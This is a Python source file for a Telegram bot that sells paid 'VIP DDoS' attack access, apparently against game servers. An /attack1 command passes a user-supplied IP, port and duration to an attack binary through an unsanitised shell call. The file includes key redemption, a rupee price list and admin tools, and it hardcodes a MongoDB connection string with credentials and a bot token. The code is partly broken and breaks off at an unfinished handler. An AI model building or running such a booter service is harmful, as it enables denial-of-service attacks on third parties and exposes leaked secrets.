import telebot
import subprocess
import requests
import datetime
import os
import random
import string
import json
import logging
import time
from pymongo import MongoClient
from datetime import datetime, timedelta
import certifi
import asyncio
import aiohttp
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
from subprocess import Popen
from threading import Thread
from collections import defaultdict

# Dictionary to store attack counts
attack_counts = defaultdict(lambda: {'daily': 0, 'hourly': 0})

def record_attack(user_id):
    now = datetime.datetime.now()
    attack_counts[user_id]['daily'] += 1
    attack_counts[user_id]['hourly'] += 1
    # Schedule a task to reset hourly count after 1 hour
    asyncio.get_event_loop().call_later(3600, reset_hourly_count, user_id)

def reset_hourly_count(user_id):
    attack_counts[user_id]['hourly'] = 0
    
loop = asyncio.get_event_loop()

MONGO_URI = 'mongodb+srv://Bishal:Bishal@bishal.dffybpx.mongodb.net/?retryWrites=true&w=majority&appName=Bishal'

# Put Your Telegram Bot Token Here
bot = telebot.TeleBot('7545154337:AAHQmoFquGWEubN3h1aaDun9Q6IjtJC2hH8')

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['zoya']
users_collection = db.users

# Admin User ID
admin_id = ["5599402910"]

# Files for data storage
USER_FILE = "users.json"
LOG_FILE = "log.txt"
KEY_FILE = "keys.json"

# Cooldown settings
COOLDOWN_TIME = 500  # in seconds

# In-memory storage
users = {}
keys = {}
bgmi_cooldown = {}

# Read users and keys from files initially
def load_data():
    global users, keys
    users = read_users()
    keys = read_keys()

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
        
def save_users():
    with open(USER_FILE, "w") as file:
        json.dump(users, file)

def read_keys():
    try:
        with open(KEY_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_keys():
    with open(KEY_FILE, "w") as file:
        json.dump(keys, file)
        

FREE_USER_FILE = "free_users_collection"  # Define this file

def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            free_user_credits = {}
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
            return free_user_credits
    except FileNotFoundError:
        return {}

# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    admin_id = ["5599402910"]
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "❌ Lᴏɢs Aʀᴇ Cʟᴇᴀʀᴇᴅ Sᴜᴄᴄᴇssғᴜʟʟʏ Nᴏ Dᴀᴛᴀ Fᴏᴜɴᴅ ❌"
            else:
                file.truncate(0)
                response = "✅ Lᴏɢs Cʟᴇᴀʀᴇᴅ Sᴜᴄᴄᴇssғᴜʟʟʏ ✅"
    except FileNotFoundError:
        response = "❓ Nᴏ Lᴏɢs Fᴏᴜɴᴅ Tᴏ Cʟᴇᴀʀ ❓"
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

# List of fun facts
fun_facts = [
    "ARZ KIYA HAI NA PYAAR KRO JHOOTA NA ISHQ KARO FARZI",
    "A B C D E F G H I J K L M N O P Q R S T U V W X Y Z   ISME 1 GAYAB HE PHIR PADHO   ABE SHARM NHI ATI ABCD ME 1 KAHA ATA HAI?  NAAM DUBA DIYA SCHOOL KA!.",
    "AAP KE PASS DIMAG HAI, CHALTA NAHI WO ALAG BAAT HAI   AAP SMART HO KOI MAANTA NHI WO ALAG BAAT HAI   KAAFI IZZAT HAI AAP KI KOI KARTA NAHI WO ALG BAAT HAI   AAP KI BE_IZZATI HORAHI HAI FIR BHI AAP PADH RHE HO WAHH KYA BAAT HAI .",
    "AAJKAL KI DUNIA MAIN, SACHE SHREEF AUR PYARE DOST MILNA BOHOT MUSHKIL HAI...  MAIN KHUD HAIRAAN HUN TUM LOGON NE MUJHE DHUND KAISE LIYA.",
    "AAJ KA GYAAN...  KAL HO TO AAJ JAISA...  MEHEL HO TO TAAJ JAISA...  PHOOL HO TO GULAAB JAISA...  AUR DOST HO TO...  O HELLO MERE JAISA...  AUR KACHRA HO TO TERE JESA..."]

def generate_key(length=20):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def add_time_to_current_date(hours=0, days=0):
    return (datetime.datetime.now() + datetime.timedelta(hours=hours, days=days)).strftime('%Y-%m-%d %H:%M:%S')

@bot.message_handler(commands=['genkey'])
def generate_key_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) == 3:
            try:
                time_amount = int(command[1])
                time_unit = command[2].lower()
                if time_unit == 'hours':
                    expiration_date = add_time_to_current_date(hours=time_amount)
                elif time_unit == 'days':
                    expiration_date = add_time_to_current_date(days=time_amount)
                else:
                    raise ValueError("Invalid time unit")
                key = generate_key()
                keys[key] = expiration_date
                save_keys()
                response = f"𝐊𝐞𝐲 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐢𝐨𝐧: {key}\n𝐄𝐬𝐩𝐢𝐫𝐞𝐬 𝐎𝐧: {expiration_date}"
            except ValueError:
                response = "𝐏𝐥𝐞𝐚𝐬𝐞 𝐒𝐩𝐞𝐜𝐢𝐟𝐲 𝐀 𝐕𝐚𝐥𝐢𝐝 𝐍𝐮𝐦𝐛𝐞𝐫 𝐚𝐧𝐝 𝐮𝐧𝐢𝐭 𝐨𝐟 𝐓𝐢𝐦𝐞 (hours/days)."
        else:
            response = "𝐔𝐬𝐚𝐠𝐞: /genkey <amount> <hours/days>"
    else:
        response = "Only Admin can use"

    bot.reply_to(message, response)

@bot.message_handler(commands=['redeem'])
def redeem_key_command(message):
    user_id = str(message.chat.id)
    command = message.text.split()
    if len(command) == 2:
        key = command[1]
        if key in keys:
            expiration_date = keys[key]
            if user_id in users:
                user_expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
                new_expiration_date = max(user_expiration, datetime.datetime.now()) + datetime.timedelta(hours=1)
                users[user_id] = new_expiration_date.strftime('%Y-%m-%d %H:%M:%S')
            else:
                users[user_id] = expiration_date
            save_users()
            del keys[key]
            save_keys()
            response = f"✅𝐊𝐞𝐲 𝐫𝐞𝐝𝐞𝐞𝐦𝐞𝐝 𝐒𝐮𝐜𝐜𝐞𝐬𝐟𝐮𝐥𝐥𝐲! 𝐀𝐜𝐜𝐞𝐬𝐬 𝐆𝐫𝐚𝐧𝐭𝐞𝐝 𝐔𝐧𝐭𝐢𝐥𝐥: {users[user_id]}"
        else:
            response = "𝙆𝙚𝙮 𝙀𝙭𝙥𝙞𝙧𝙚𝙙 𝙤𝙧 𝙞𝙣𝙫𝙖𝙡𝙞𝙙 ."
    else:
        response = "𝐔𝐬𝐚𝐠𝐞: /redeem <key>"

    bot.reply_to(message, response)

def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    response = f"💎 𝐃𝐄𝐀𝐑 PAID 𝐔𝐒𝐄𝐑 {username} 💎\n\n🟢 𝐘𝐎𝐔𝐑 𝐀𝐓𝐓𝐀𝐂𝐊5 𝐒𝐓𝐀𝐑𝐓𝐄𝐃 🟢\n\n🎯 𝐇𝐨𝐬𝐭: {target}\n🔗 𝐏𝐨𝐫𝐭: {port}\n⏳ 𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n⚙️ 𝐌𝐞𝐭𝐡𝐨𝐝 : PRIVATE \n\n📝 𝐀𝐝𝐯𝐢𝐜𝐞 :-\n⏸️ 𝐘𝐨𝐮𝐫 𝐀𝐭𝐭𝐚𝐜𝐤 𝐖𝐢𝐥𝐥 𝐁𝐞 𝐅𝐢𝐧𝐢𝐬𝐡𝐞𝐝 𝐈𝐧 {time} 𝐖𝐚𝐢𝐭 𝐓𝐡𝐞𝐫𝐞 𝐖𝐢𝐭𝐡𝐨𝐮𝐭 𝐓𝐨𝐮𝐜𝐡𝐢𝐧𝐠 𝐀𝐧𝐲 𝐁𝐮𝐭𝐭𝐨𝐧 \n\nSEND FEEDBACK TO @BeasTxt_Sasuke \nNO FEEDBACK YOUR ATTACK WILL BE BLOCKED BY SASUKE"
    bot.reply_to(message, response)

# Bot Command Handler For attack1
@bot.message_handler(commands=['attack1'])
def handle_attack(message):
    user_id = str(message.chat.id)
    
    if user_id in users:
        expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
        if datetime.datetime.now() > expiration_date:
            response = "❌ 𝙔𝙤𝙪𝙧 𝙫𝙞𝙥 𝘼𝙘𝙘𝙚𝙨𝙨 𝙝𝙖𝙨 𝙗𝙚𝙚𝙣 𝙚𝙭𝙥𝙞𝙧𝙚𝙙 Kindly Dm @BeasTxt_Sasuke to get access❌"
            bot.reply_to(message, response)
            return

        if user_id not in admin_id:
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                remaining_time = COOLDOWN_TIME - (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds
                response = f"You Are On Cooldown. Please Wait {remaining_time} seconds Before Running The /attack5 Command Again."
                bot.reply_to(message, response)
                return

        command = message.text.split()
        if len(command) == 4:
            target = command[1]
            port = int(command[2])
            time = int(command[3])
            if time > 200:
                response = "⚠️ Eʀʀᴏʀ : Tɪᴍᴇ Iɴᴛᴇʀᴠᴀʟ Mᴜsᴛ Bᴇ Lᴇss Tʜᴀɴ 190 Sᴇᴄᴏɴᴅs"
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)
                
                # Set the cooldown start time
                bgmi_cooldown[user_id] = datetime.datetime.now()
                
                full_command = f"./sasuke2 {target} {port} {time}"
                subprocess.run(full_command, shell=True)
                
                # Reset cooldown after the attack is finished
                
                
                response = f"💎 𝐃𝐄𝐀𝐑 PAID 𝐔𝐒𝐄𝐑 💎\n\n🛑 𝐘𝐎𝐔𝐑 𝐀𝐓𝐓𝐀𝐂𝐊1 𝐅𝐈𝐍𝐈𝐒𝐇𝐄𝐃 🛑\n\n⚙️ 𝐌𝐞𝐭𝐡𝐨𝐝 : PREMIUM\n\n📝 𝐀𝐝𝐯𝐢𝐜𝐞 :-\n📶 𝐘𝐨𝐮𝐫 𝐈𝐧𝐭𝐞𝐫𝐧𝐞𝐭 𝐈𝐬 𝐍𝐨𝐫𝐦𝐚𝐥 𝐍𝐨𝐰 𝐊𝐢𝐥𝐥 𝐀𝐥𝐥 𝐓𝐡𝐞 𝐏𝐥𝐚𝐲𝐞𝐫'𝐬 𝐀𝐧𝐝 𝐆𝐢𝐯𝐞 𝐅𝐞𝐞𝐝𝐛𝐚𝐜𝐤𝐬 𝐈𝐧 𝐂𝐡𝐚𝐭 𝐆𝐫𝐨𝐮𝐩 AND TO @BeasTxt_Sasuke"
        else:
            response = "⚠️ Iɴᴠᴀʟɪᴅ Fᴏʀᴍᴀᴛ ⚠️\n\n✅ Usᴀɢᴇ : /attack1 <ɪᴘ> <ᴘᴏʀᴛ> <ᴅᴜʀᴀᴛɪᴏɴ>\n\n✅ Fᴏʀ Exᴀᴍᴘʟᴇ: /attack1 127.0.0.1 8700 200"
    else:
        response = "💢 Oɴʟʏ Pᴀɪᴅ Mᴇᴍʙᴇʀs Cᴀɴ Usᴇ Tʜɪs Cᴏᴍᴍᴀɴᴅ 💢\n\n DM @BeasTxt_Sasuke to 🗝️"

    bot.reply_to(message, response)

import datetime

# Dictionary to store the approval expiry date for each user
user_approval_expiry = {}

# Function to calculate remaining approval time
def get_remaining_approval_time(user_id):
    expiry_date = user_approval_expiry.get(user_id)
    if expiry_date:
        remaining_time = expiry_date - datetime.datetime.now()
        if remaining_time.days < 0:
            return "Exᴘɪʀᴇᴅ"
        else:
            return str(remaining_time)
    else:
        return "Nᴏᴛ Aᴘᴘʀᴏᴠᴇᴅ"

# Function to add or update user approval expiry date
def set_approval_expiry_date(user_id, duration, time_unit):
    current_time = datetime.datetime.now()
    if time_unit == "hour" or time_unit == "hours":
        expiry_date = current_time + datetime.timedelta(hours=duration)
    elif time_unit == "day" or time_unit == "days":
        expiry_date = current_time + datetime.timedelta(days=duration)
    elif time_unit == "week" or time_unit == "weeks":
        expiry_date = current_time + datetime.timedelta(weeks=duration)
    elif time_unit == "month" or time_unit == "months":
        expiry_date = current_time + datetime.timedelta(days=30*duration)  # Approximation of a month
    else:
        return False
    
    user_approval_expiry[user_id] = expiry_date
    return True

# Handler for fun fact command
@bot.message_handler(commands=['funfact'])
def handle_funfact(message):
    fact = random.choice(fun_facts)
    bot.reply_to(message, fact)

# Command handler for adding a user with approval time
@bot.message_handler(commands=['approve'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 2:
            user_to_add = command[1]
            duration_str = command[2]

            try:
                duration = int(duration_str[:-4])  # Extract the numeric part of the duration
                if duration <= 0:
                    raise ValueError
                time_unit = duration_str[-4:].lower()  # Extract the time unit (e.g., 'hour', 'day', 'week', 'month')
                if time_unit not in ('hour', 'hours', 'day', 'days', 'week', 'weeks', 'month', 'months'):
                    raise ValueError
            except ValueError:
                response = "⚠️ Iɴᴠᴀʟɪᴅ Dᴜʀᴀᴛɪᴏɴ Fᴏʀᴍᴀᴛ ⚠️\n\n✅ Usᴀɢᴇ : /approve <ᴜsᴇʀ_ɪᴅ> <ᴅᴜʀᴀᴛɪᴏɴ_ɪɴ_ᴅᴀʏs>\n✅ Fᴏʀ Exᴀᴍᴘʟᴇ : /approve 5510109123 <30ᴅᴀʏs>"
                bot.reply_to(message, response)
                return

            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                if set_approval_expiry_date(user_to_add, duration, time_unit):
                    response = f"👤 Usᴇʀ {user_to_add} Aᴅᴅᴇᴅ Sᴜᴄᴄᴇssғᴜʟʟʏ Fᴏʀ {duration} {time_unit} Aᴄᴄᴇss Wɪʟʟ Exᴘɪʀᴇ Oɴ {user_approval_expiry[user_to_add].strftime('%Y-%m-%d %H:%M:%S')} ✅"
                else:
                    response = "🤦 Fᴀɪʟᴇᴅ Tᴏ Sᴇᴛ Aᴘᴘʀᴏᴠᴀʟ Exᴘɪʀʏ Dᴀᴛᴇ 🤦"
            else:
                response = "👤 Usᴇʀ Aʟʀᴇᴀᴅʏ Exɪsᴛs 👤"
        else:
            response = "🤖 Pʟᴇᴀsᴇ Sᴘᴇᴄɪғʏ A Usᴇʀ Iᴅ Aɴᴅ Tʜᴇ Dᴜʀᴀᴛɪᴏɴ ( ✅ Exᴀᴍᴘʟᴇ : 1ʜᴏᴜʀ, 2ᴅᴀʏs, 3ᴡᴇᴇᴋ )"
    else:
        response = "💢 Oɴʟʏ Aᴅᴍɪɴs Cᴀɴ Rᴜɴ Tʜɪs Cᴏᴍᴍᴀɴᴅ 💢"

    bot.reply_to(message, response)

# Command handler for retrieving user info
@bot.message_handler(commands=['myinfo'])
def get_user_info(message):
    user_id = str(message.chat.id)
    user_info = bot.get_chat(user_id)
    user_name = user_info.username
    user_first = user_info.first_name
    user_last = user_info.last_name
    user_role = "Aᴅᴍɪɴ" if user_id in admin_id else "Usᴇʀ"
    remaining_time = get_remaining_approval_time(user_id)
    response = f"ℹ️ Yᴏᴜʀ Iɴғᴏ :\n\n🆔 Usᴇʀ ID : <code>{user_id}</code>\n💳 Usᴇʀɴᴀᴍᴇ : @{user_name}\n👤 Fɪʀsᴛ Nᴀᴍᴇ : {user_first}\n👤 Lᴀsᴛ Nᴀᴍᴇ : {user_last}\n\nℹ️ Yᴏᴜʀ Iɴғᴏ Oɴ Storm 𝐕ɪᴘ 𝐃𝐃ᴏ𝐒ᵛ² :\n\n🏷️ Rᴏʟᴇ : {user_role}\n📆 Aᴘᴘʀᴏᴠᴀʟ Exᴘɪʀʏ : {user_approval_expiry.get(user_id, 'Nᴏᴛ Aᴘᴘʀᴏᴠᴇᴅ')}\n⏳ Rᴇᴍᴀɪɴɪɴɢ Aᴘᴘʀᴏᴠᴀʟ Tɪᴍᴇ : {remaining_time}"
    bot.reply_to(message, response, parse_mode="HTML")

@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"🤖 Yᴏᴜʀ Iᴅ : {user_id}"
    bot.reply_to(message, response)

@bot.message_handler(commands=['disapprove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"🚮 Usᴇʀ {user_to_remove} Rᴇᴍᴏᴠᴇᴅ Sᴜᴄᴄᴇssғᴜʟʟʏ 🚮"
            else:
                response = f"❌ Usᴇʀ {user_to_remove} Nᴏᴛ Fᴏᴜɴᴅ Iɴ Tʜᴇ Lɪsᴛ ❌"
        else:
            response = '''🤖 Pʟᴇᴀsᴇ Sᴘᴇᴄɪғʏ A Usᴇʀ ID Tᴏ Rᴇᴍᴏᴠᴇ 🤖'''
    else:
        response = ""

    bot.reply_to(message, response)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        response = clear_logs()
    else:
        response = "ADMIN CAN USE THIS."
    bot.reply_to(message, response)
    

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if users:
            response = "𝐂𝐇𝐔𝐓𝐘𝐀 𝐔𝐒𝐑𝐄𝐑 𝐋𝐈𝐒𝐓:\n"
            for user_id, expiration_date in users.items():
                try:
                    user_info = bot.get_chat(int(user_id))
                    username = user_info.username if user_info.username else f"UserID: {user_id}"
                    response += f"- @{username} (ID: {user_id}) expires on {expiration_date}\n"
                except Exception:
                    response += f"- 𝐔𝐬𝐞𝐫 𝐢𝐝: {user_id} 𝐄𝐱𝐩𝐢𝐫𝐞𝐬 𝐨𝐧 {expiration_date}\n"
        else:
            response = "𝐀𝐣𝐢 𝐋𝐚𝐧𝐝 𝐌𝐞𝐫𝐚"
    else:
        response = "𝐎𝐍𝐋𝐘 𝐎𝐖𝐍𝐄𝐑 𝐂𝐀𝐍 𝐃𝐎 𝐓𝐇𝐀𝐓"
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "❌ Nᴏ Dᴀᴛᴀ Fᴏᴜɴᴅ ❌"
                bot.reply_to(message, response)
        else:
            response = "❌ Nᴏ Dᴀᴛᴀ Fᴏᴜɴᴅ ❌"
            bot.reply_to(message, response)
    else:
        response = "💢 Oɴʟʏ Aᴅᴍɪɴs Cᴀɴ Rᴜɴ Tʜɪs Cᴏᴍᴍᴀɴᴅ 💢"
        bot.reply_to(message, response)


# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Yᴏᴜʀ Cᴏᴍᴍᴀɴᴅ Lᴏɢs :\n" + "".join(user_logs)
                else:
                    response = "❌ Nᴏ Cᴏᴍᴍᴀɴᴅ Lᴏɢs Fᴏᴜɴᴅ Fᴏʀ Yᴏᴜ ❌"
        except FileNotFoundError:
            response = "❌ Nᴏ Cᴏᴍᴍᴀɴᴅ Lᴏɢs Fᴏᴜɴᴅ ❌"
    else:
        response = "💢 Oɴʟʏ Pᴀɪᴅ Mᴇᴍʙᴇʀs Cᴀɴ Usᴇ Tʜɪs Cᴏᴍᴍᴀɴᴅ 💢"

    bot.reply_to(message, response)
    
@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        response = clear_logs()
    else:
        response = "💢 Oɴʟʏ Aᴅᴍɪɴs Cᴀɴ Rᴜɴ Tʜɪs Cᴏᴍᴍᴀɴᴅ 💢"
    bot.reply_to(message, response)

@bot.message_handler(commands=['help'])
def show_help(message):
    help_text ='''🤖 Aᴠᴀɪʟᴀʙʟᴇ Cᴏᴍᴍᴀɴᴅ :

🚀 /attack1 : Tᴏ Aᴛᴛᴀᴄᴋ.
🚦 /rules : Tᴏ Aᴠᴏɪᴅ Bᴀɴ.
🧾 /mylogs : Tᴏ Cʜᴇᴄᴋ Lᴏɢs.
💸 /plan : 𝐕ɪᴘ 𝐃𝐃ᴏ𝐒ᵛ Pʟᴀɴs.
ℹ️ℹ️ /myinfo : Yᴏᴜʀ Dᴇᴛᴀɪʟs.
💥 /redeem <key>: 𝐊𝐞𝐲 𝐑𝐞𝐝𝐞𝐞𝐦 𝐰𝐚𝐥𝐚 𝐂𝐨𝐦𝐦𝐚𝐧𝐝.

𝐓𝐨 𝐒𝐞𝐞 𝐓𝐮𝐭𝐨𝐫𝐢𝐚𝐥 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬
👨‍🏫 /tutorial : 𝐒𝐡𝐨𝐰𝐬 𝐓𝐡𝐞 𝐓𝐮𝐭𝐨𝐫𝐢𝐚𝐥.

Tᴏ Sᴇᴇ Aᴅᴍɪɴ Cᴏᴍᴍᴀɴᴅs
💎 /admin : Sʜᴏᴡs Aʟʟ Aᴅᴍɪɴ Cᴏᴍᴍᴀɴᴅs

🛒 𝐁𝐮𝐲 𝐅𝐫𝐨𝐦 :-\n𝟏.@BeasTxt_Sasuke\n
🏫 Oғғɪᴄɪᴀʟ Cʜᴀɴɴᴇʟ : https://t.me/bgmisellingbuying
'''


    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''💐 Wᴇʟᴄᴏᴍᴇ {user_name} Fᴇᴇʟ Fʀᴇᴇ Tᴏ Exᴘʟᴏʀᴇ Tʀʏ Tᴏ Rᴜɴ /help Cᴏᴍᴍᴀɴᴅ Fᴏʀ Mᴏʀᴇ Fᴇᴀᴛᴜʀᴇs'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Pʟᴇᴀsᴇ Fᴏʟʟᴏᴡ Tʜᴇsᴇ Rᴜʟᴇs 🚦 :
𝟏. 𝐃𝐨𝐧𝐭 𝐑𝐮𝐧 𝐓𝐨𝐨 𝐌𝐚𝐧𝐲 𝐀𝐭𝐭𝐚𝐜𝐤𝐬 !! 𝐂𝐚𝐮𝐬𝐞 𝐀 𝐁𝐚𝐧 𝐅𝐫𝐨𝐦 𝐁𝐨𝐭
𝟐. 𝐃𝐨𝐧𝐭 𝐑𝐮𝐧 𝟐 𝐀𝐭𝐭𝐚𝐜𝐤𝐬 𝐀𝐭 𝐒𝐚𝐦𝐞 𝐓𝐢𝐦𝐞 𝐁𝐞𝐜𝐳 𝐈𝐟 𝐔 𝐓𝐡𝐞𝐧 𝐔 𝐆𝐨𝐭 𝐁𝐚𝐧𝐧𝐞𝐝 𝐅𝐫𝐨𝐦 𝐁𝐨𝐭.
𝟑. 𝐌𝐚𝐤𝐞 𝐒𝐮𝐫𝐞 𝐘𝐨𝐮 𝐉𝐨𝐢𝐧𝐞𝐝 @https://t.me/bgmisellingbuying 𝐎𝐭𝐡𝐞𝐫𝐰𝐢𝐬𝐞 𝐓𝐡𝐞 𝐃𝐃𝐨𝐒 𝐖𝐢𝐥𝐥 𝐍𝐨𝐭 𝐖𝐨𝐫𝐤.
𝟒. 𝐖𝐞 𝐃𝐚𝐢𝐥𝐲 𝐂𝐡𝐞𝐜𝐤𝐬 𝐓𝐡𝐞 𝐋𝐨𝐠𝐬 𝐒𝐨 𝐅𝐨𝐥𝐥𝐨𝐰 𝐭𝐡𝐞𝐬𝐞 𝐫𝐮𝐥𝐞𝐬 𝐭𝐨 𝐚𝐯𝐨𝐢𝐝 𝐁𝐚𝐧!!!'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Wᴇ Hᴀᴠᴇ Mᴀɴʏ Pʟᴀɴs Aɴᴅ Eᴠᴇʀʏ Pʟᴀɴ Is Pᴏᴡᴇʀғᴜʟʟ Tʜᴇɴ Oᴛʜᴇʀ's DDᴏS Aɴᴅ Tʜᴇʏ Aʀᴇ 𝐕ɪᴘ 𝐃𝐃ᴏ𝐒ᵛ² Pʟᴀɴs !!!\n\n💎 𝐕ɪᴘ 𝐃𝐃ᴏ𝐒ᵛ²\n\n🤖 Fᴇᴀᴛᴜʀᴇs :\n-> Aᴛᴛᴀᴄᴋ Tɪᴍᴇ - 600 Sᴇᴄᴏɴᴅs\n> Aғᴛᴇʀ Aᴛᴛᴀᴄᴋ Lɪᴍɪᴛ - Tɪʟʟ Fɪʀsᴛ Fɪɴɪsʜᴇs\n-> Aᴛᴛᴀᴄᴋ Tʜʀᴇᴀᴅs - 150\n> Wᴏʀᴋɪɴɢ Aᴛᴛᴀᴄᴋ - 10/10\n-> Fᴜʟʟ Sᴀғᴇ Wɪᴛʜ Nᴏ Bᴀɴ Issᴜᴇ\n\n💸 Pʀɪᴄᴇ Lɪsᴛ :\n60 Mɪɴᴜᴛᴇs 📆 = Hᴏᴜʀ ⌛- ₹50 💵\n24 Hᴏᴜʀs 📆 = Dᴀʏ ⌛- ₹200 💵\n7 Dᴀʏs 📆 = Wᴇᴇᴋ ⌛- ₹1000 💵\n15 Dᴀʏs 📆 = 1/2 Mᴏɴᴛʜ ⌛- ₹2500 💵\n30 Dᴀʏs 📆 = Mᴏɴᴛʜ ⌛- ₹3800 💵\n6 Mᴏɴᴛʜs 📆 = 1/2 Yᴇᴀʀ ⌛- ₹5000 💵\n\n💎 Iғ Yᴏᴜ Wᴀɴᴛ Tᴏ Bᴜʏ Aɴʏ Pʟᴀɴ Gɪᴠᴇɴ Uᴘ Cᴏɴᴛᴀᴄᴛ :\n1.@BeasTxt_Sasuke'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_admin(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Aᴅᴍɪɴ Cᴏᴍᴍᴀɴᴅs Aʀᴇ Hᴇʀᴇ :
    
➕🧒/approve : Aᴘᴘʀᴏᴠᴇ A Usᴇʀ
➖🧒/dispprove : Dɪsᴀᴘᴘʀᴏᴠᴇ A Usᴇʀ
💎🧒/allusers : Aᴜᴛʜᴏʀɪsᴇᴅ Usᴇʀs.
🧾🚀/logs : Aʟʟ Usᴇʀ Lᴏɢs.
🧹🧹/clearlogs: 𝐅𝐮𝐜𝐤 𝐓𝐡𝐞 𝐥𝐨𝐆 𝐟𝐢𝐥𝐞.
💬🧒/broadcast : Bʀᴏᴀᴅᴄᴀsᴛ A Mᴇssᴀɢᴇ.
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "💬 Mᴇssᴀɢᴇ Tᴏ Aʟʟ Usᴇʀs Bʏ Aᴅᴍɪɴ :\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"❌ Fᴀɪʟᴇᴅ Tᴏ Sᴇɴᴛ Bʀᴏᴀᴅᴄᴀsᴛ Mᴇssᴀɢᴇ Tᴏ Tʜᴇ Usᴇʀ {user_id}: {str(e)}")
            response = "✅ Bʀᴏᴀᴅᴄᴀsᴛ Mᴇssᴀɢᴇ Sᴇɴᴛ Tᴏ Aʟʟ Usᴇʀs Sᴜᴄᴄᴇssғᴜʟʟʏ ✅"
        else:
            response = "💢 Pʟᴇᴀsᴇ Pʀᴏᴠɪᴅᴇ A Mᴇssᴀɢᴇ Tᴏ Bʀᴏᴀᴅᴄᴀsᴛ 💢"
    else:
        response = "💢 Oɴʟʏ Aᴅᴍɪɴs Cᴀɴ Rᴜɴ Tʜɪs Cᴏᴍᴍᴀɴᴅ 💢"

    bot.reply_to(message, response)
    
@bot.message_handler(commands=['tutorial'])
